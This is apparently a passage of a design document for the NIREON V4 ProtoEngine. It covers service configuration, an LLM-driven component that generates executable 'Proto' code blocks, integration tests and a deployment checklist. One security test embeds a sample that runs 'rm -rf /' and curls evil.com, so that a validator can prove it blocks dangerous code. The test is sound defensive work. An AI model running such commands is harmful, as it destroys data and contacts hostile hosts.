  #     artifacts_directory: "${PROTO_ARTIFACTS_DIR:-runtime/proto/graph/artifacts}"
  #     dialect_configs:
  #       graph:
  #         allowed_packages:
  #           - "networkx"
  #           - "matplotlib"
  #           - "numpy"

services:
  - id: "proto_gateway_main"
    class: "nireon_v4.proto_engine.service.ProtoGateway"
    init_args:
      dialect_to_component:
        math: "proto_engine_math"
        # graph: "proto_engine_graph"  # add when ready
        # simulate: "proto_engine_simulate"

  - id: "proto_generator"
    class: "nireon_v4.proto_generator.service.ProtoGenerator"
    config:
      supported_dialects:
        - "math"
        - "graph"
        - "simulate"
      default_dialect: "math"

  - id: "explorer_primary"
    class: "Explorer"
    config:
      max_depth: 3
      exploration_strategy: "breadth_first"
      confidence_threshold: 0.6

  - id: "catalyst_main" 
    class: "Catalyst"
    config:
      amplification_factor: 1.5
      min_trust_score: 0.7

observers:
  - id: "sentinel_guardian"
    class: "Sentinel" 
    config:
      check_interval: 10
      alert_threshold: 0.9
      monitor_proto_executions: true
```

### Phase 4: LLM Integration for Proto Generation (Week 4-5)

#### 4.1 Proto Generator Component

**Location:** `nireon_v4/proto_generator/service.py`

```python
from typing import Dict, Any, List
import yaml
import json

from nireon_v4.application.components.base import NireonBaseComponent
from nireon_v4.application.context import ExecutionContext
from nireon_v4.application.components.lifecycle import ProcessResult
from nireon_v4.signals.core import ProtoTaskSignal
from nireon_v4.domain.proto.base_schema import ProtoBlock
from nireon_v4.domain.proto.validation import get_validator_for_dialect

class ProtoGenerator(NireonBaseComponent):
    """
    Generates Proto blocks from natural language requests using LLM.
    
    This component can generate Proto blocks for any supported dialect,
    making it the entry point for declarative task specification.
    """
    
    PROTO_GENERATION_PROMPT = """
You are a Proto block generator for the NIREON ProtoEngine system.
Generate executable Proto blocks based on the user's request.

Proto blocks are declarative specifications that get executed in secure containers.
The 'eidos' field determines the dialect and execution environment.

Available dialects:
- math: Mathematical computations, plotting, numerical analysis
- graph: Network analysis, graph algorithms, visualization
- simulate: Discrete event simulation, Monte Carlo methods

Proto Block Schema:
```yaml
schema_version: proto/1.0
eidos: {dialect}
id: UNIQUE_ID_HERE
description: "Brief description"
objective: "What this analysis achieves"
function_name: main_function
inputs:
  param1: value1
  param2: value2
code: |
  # Import statements based on dialect
  
  def main_function(param1, param2):
      # Your implementation here
      return result

requirements: []  # Optional: additional packages needed
limits:
  timeout_sec: 10
  memory_mb: 256
```

Dialect-specific guidelines:
- math: Use numpy, scipy, matplotlib. Can include equation_latex field.
- graph: Use networkx for graph operations. Return graph metrics or visualizations.
- simulate: Use simpy or custom logic. Return simulation results.

User Request: {user_request}
Suggested Dialect: {suggested_dialect}

Generate a complete Proto block:
"""

    def __init__(self, instance_id: str, config: Dict[str, Any], **kwargs):
        super().__init__(instance_id, config, **kwargs)
        self.supported_dialects = config.get('supported_dialects', ['math', 'graph', 'simulate'])
        self.default_dialect = config.get('default_dialect', 'math')
    
    async def process(self, data: Any, context: ExecutionContext) -> ProcessResult:
        """Generate Proto block from natural language request."""
        
        try:
            user_request = data.get('natural_language_request', '')
            suggested_dialect = data.get('dialect', self._infer_dialect(user_request))
            
            if not user_request:
                return ProcessResult(
                    success=False,
                    message="No natural language request provided",
                    component_id=self.instance_id
                )
            
            # Get LLM service
            llm_service = context.component_registry.get_service_instance("llm_router")
            if not llm_service:
                return ProcessResult(
                    success=False,
                    message="LLM service not available",
                    component_id=self.instance_id
                )
            
            # Generate Proto block
            prompt = self.PROTO_GENERATION_PROMPT.format(
                dialect=suggested_dialect,
                user_request=user_request,
                suggested_dialect=suggested_dialect
            )
            
            llm_response = await llm_service.call_llm_async(
                prompt=prompt,
                temperature=0.3,  # Lower temperature for more consistent code
                max_tokens=2000
            )
            
            # Parse YAML response
            try:
                proto_data = yaml.safe_load(llm_response.text)
            except yaml.YAMLError as e:
                return ProcessResult(
                    success=False,
                    message=f"Failed to parse LLM response as YAML: {e}",
                    component_id=self.instance_id
                )
            
            # Validate generated Proto block
            dialect = proto_data.get('eidos', 'unknown')
            validator = get_validator_for_dialect(dialect)
            
            try:
                proto_block = ProtoBlock(**proto_data)
                validation_errors = validator.validate(proto_block)
                
                if validation_errors:
                    return ProcessResult(
                        success=False,
                        message=f"Generated Proto block failed validation: {'; '.join(validation_errors)}",
                        component_id=self.instance_id
                    )
                
            except Exception as e:
                return ProcessResult(
                    success=False,
                    message=f"Generated Proto block schema validation failed: {e}",
                    component_id=self.instance_id
                )
            
            # Emit Proto task signal
            proto_signal = ProtoTaskSignal(
                source_node_id=self.instance_id,
                proto_block=proto_data,
                dialect=dialect,
                execution_priority=5
            )
            
            await context.event_bus.publish(proto_signal.signal_type, proto_signal.dict())
            
            return ProcessResult(
                success=True,
                message=f"Generated and queued Proto block: {proto_block.id} (dialect: {dialect})",
                component_id=self.instance_id,
                output_data={"proto_block": proto_data}
            )
            
        except Exception as e:
            self.logger.error(f"Error in Proto generation: {e}", exc_info=True)
            return ProcessResult(
                success=False,
                message=f"Proto generation failed: {e}",
                component_id=self.instance_id
            )
    
    def _infer_dialect(self, request: str) -> str:
        """Infer the most appropriate dialect from the request."""
        request_lower = request.lower()
        
        # Simple keyword-based inference
        if any(word in request_lower for word in ['plot', 'graph', 'visualize', 'equation', 'calculate', 'integral']):
            return 'math'
        elif any(word in request_lower for word in ['network', 'nodes', 'edges', 'shortest path', 'connected']):
            return 'graph'
        elif any(word in request_lower for word in ['simulate', 'simulation', 'monte carlo', 'random']):
            return 'simulate'
        
        return self.default_dialect
```

### Phase 5: Testing & Validation (Week 5-6)

#### 5.1 Integration Test Suite

**Location:** `tests/integration/test_proto_engine.py`

```python
import pytest
import asyncio
import tempfile
from pathlib import Path

from nireon_v4.bootstrap import bootstrap_nireon_system
from nireon_v4.signals.core import ProtoTaskSignal, ProtoResultSignal, MathProtoResultSignal
from nireon_v4.domain.proto.base_schema import ProtoBlock, ProtoMathBlock

@pytest.fixture
async def nireon_system():
    """Bootstrap a minimal NIREON system for testing."""
    with tempfile.TemporaryDirectory() as temp_dir:
        # Create test manifest
        test_manifest = Path(temp_dir) / "test_manifest.yaml"
        test_manifest.write_text("""
version: "1.0"
proto_engines:
  - id: "proto_engine_test"
    class: "nireon_v4.proto_engine.service.ProtoEngine"
    config:
      execution_mode: "subprocess"
      work_directory: "{temp_dir}/work"
      artifacts_directory: "{temp_dir}/artifacts"
      dialect_configs:
        math:
          allowed_packages: ["numpy", "matplotlib"]
        graph:
          allowed_packages: ["networkx"]
""".format(temp_dir=temp_dir))
        
        boot_result = await bootstrap_nireon_system(
            config_paths=[test_manifest],
            strict_mode=False
        )
        
        assert boot_result.success
        yield boot_result

@pytest.mark.asyncio
async def test_math_proto_execution(nireon_system):
    """Test execution of a math dialect Proto block."""
    
    proto_block = ProtoMathBlock(
        id="TEST_MATH_PROTO",
        description="Mathematical computation test",
        objective="Test mathematical Proto execution",
        function_name="compute",
        code="""
import numpy as np

def compute(x, n):
    return float(np.sum([x**i for i in range(n)]))
""",
        inputs={"x": 2, "n": 5},
        equation_latex=r"\sum_{i=0}^{n-1} x^i"
    )
    
    # Get proto engine
    registry = nireon_system.registry
    proto_engine = registry.get_service_instance("proto_engine_test")
    assert proto_engine is not None
    
    # Create execution context
    from nireon_v4.application.context import NireonExecutionContext
    context = NireonExecutionContext(
        run_id="test_run",
        component_id="test",
        component_registry=registry,
        event_bus=registry.get_service_instance("event_bus")
    )
    
    # Execute
    result = await proto_engine.process(
        {"proto_block": proto_block.dict(), "dialect": "math"},
        context
    )
    
    assert result.success
    assert result.output_data["success"] is True
    assert result.output_data["result"] == 31.0  # 2^0 + 2^1 + 2^2 + 2^3 + 2^4

@pytest.mark.asyncio
async def test_dialect_routing(nireon_system):
    """Test that different dialects are handled correctly."""
    
    # Create a generic Proto block (simulating unknown dialect)
    proto_block = ProtoBlock(
        id="TEST_GENERIC_PROTO",
        eidos="custom",
        description="Generic Proto test",
        objective="Test dialect routing",
        function_name="process",
        code="""
def process():
    return {"status": "executed", "dialect": "custom"}
""",
        inputs={}
    )
    
    registry = nireon_system.registry
    proto_engine = registry.get_service_instance("proto_engine_test")
    
    from nireon_v4.application.context import NireonExecutionContext
    context = NireonExecutionContext(
        run_id="test_run",
        component_id="test",
        component_registry=registry,
        event_bus=registry.get_service_instance("event_bus")
    )
    
    # Should execute with basic security validation only
    result = await proto_engine.process(
        {"proto_block": proto_block.dict()},
        context
    )
    
    assert result.success
    assert result.output_data["result"]["dialect"] == "custom"

@pytest.mark.asyncio
async def test_security_validation_across_dialects():
    """Test that security validation works for all dialects."""
    
    from nireon_v4.domain.proto.validation import get_validator_for_dialect
    
    # Test dangerous code is blocked regardless of dialect
    for dialect in ['math', 'graph', 'unknown']:
        dangerous_proto = ProtoBlock(
            id=f"DANGEROUS_{dialect.upper()}",
            eidos=dialect,
            description="Security test",
            objective="Should be blocked",
            function_name="evil",
            code="""
import os
import subprocess

def evil():
    os.system("rm -rf /")
    subprocess.run(["curl", "evil.com"])
    return "bad"
""",
            inputs={}
        )
        
        validator = get_validator_for_dialect(dialect)
        errors = validator.validate(dangerous_proto)
        
        assert len(errors) > 0
        assert any("Blocked import" in error for error in errors)

@pytest.mark.asyncio
async def test_proto_generator_dialect_inference(nireon_system):
    """Test Proto generator can infer appropriate dialects."""
    
    # This would test the ProtoGenerator component
    # Implementation depends on ProtoGenerator being in the test system
    pass

@pytest.mark.asyncio
async def test_concurrent_multi_dialect_execution(nireon_system):
    """Test concurrent execution of different Proto dialects."""
    
    registry = nireon_system.registry
    proto_engine = registry.get_service_instance("proto_engine_test")
    event_bus = registry.get_service_instance("event_bus")
    
    # Create Proto blocks for different dialects
    math_proto = ProtoMathBlock(
        id="CONCURRENT_MATH",
        description="Math computation",
        objective="Concurrent test",
        function_name="calc",
        code="def calc(x): return x * 2",
        inputs={"x": 21}
    )
    
    generic_proto = ProtoBlock(
        id="CONCURRENT_GENERIC",
        eidos="data",
        description="Data processing",
        objective="Concurrent test",
        function_name="process",
        code="def process(data): return len(data)",
        inputs={"data": [1, 2, 3, 4, 5]}
    )
    
    from nireon_v4.application.context import NireonExecutionContext
    context = NireonExecutionContext(
        run_id="test_run",
        component_id="test",
        component_registry=registry,
        event_bus=event_bus
    )
    
    # Execute concurrently
    tasks = [
        proto_engine.process({"proto_block": math_proto.dict()}, context),
        proto_engine.process({"proto_block": generic_proto.dict()}, context)
    ]
    
    results = await asyncio.gather(*tasks)
    
    # Both should succeed
    assert all(r.success for r in results)
    assert results[0].output_data["result"] == 42
    assert results[1].output_data["result"] == 5
```

## Deployment Checklist

### Pre-Deployment Validation
- [ ] All unit tests pass for core ProtoEngine
- [ ] Dialect-specific validators are implemented and tested
- [ ] Security validation works across all dialects
- [ ] Subprocess/Docker executors function correctly
- [ ] Proto schema validation works for all dialects
- [ ] File system permissions are correctly set
- [ ] Event bus integration functions correctly

### Production Configuration
- [ ] Configure execution mode (subprocess vs Docker)
- [ ] Set appropriate timeout limits per dialect
- [ ] Configure memory limits per dialect
- [ ] Set up dialect-specific Docker images (if using Docker mode)
- [ ] Configure artifact cleanup policies
- [ ] Set up monitoring and alerting
- [ ] Configure rate limiting per dialect if needed

### Adding New Dialects
1. Define ProtoBlock subclass in `base_schema.py`
2. Implement dialect-specific validator in `validation.py`
3. Register validator in `DIALECT_VALIDATORS`
4. Add dialect configuration to manifests
5. Register new dialect in ProtoGateway map
6. (Optional) Create specialized executor
7. (Optional) Create dialect-specific result signal
8. Update ProtoGenerator prompt with dialect guidelines

### Monitoring & Maintenance
- [ ] Monitor execution times per dialect
- [ ] Track success/failure rates by dialect
- [ ] Monitor resource usage patterns
- [ ] Set up alerts for security violations
- [ ] Regular cleanup of old artifacts
- [ ] Performance analysis per dialect
- [ ] Track most-used dialects for optimization

## Conclusion

The ProtoEngine provides a flexible, secure, and extensible foundation for declarative task execution in NIREON V4. By treating execution as a dialect-agnostic concern, we enable:

- **Easy addition of new cognitive dialects** without core system changes
- **Consistent security and validation** across all execution types  
- **Flexible execution backends** (subprocess, Docker, cloud functions)
- **Clear separation** between declaration (Proto) and execution (Engine)
- **Epistemic integration** through standardized result signals
- **Pairs cleanly with existing MechanismGateway**, enabling dual-plane execution (static vs. dynamic)

Long-term, as the Mechanism plane adopts container execution, the two gateways may converge into a single unified Cognitive Execution Gateway, providing a consistent interface for all computational tasks regardless of their execution model.

This architecture positions NIREON to handle any computational task that can be expressed declaratively, from mathematical analysis to graph algorithms to simulations and beyond.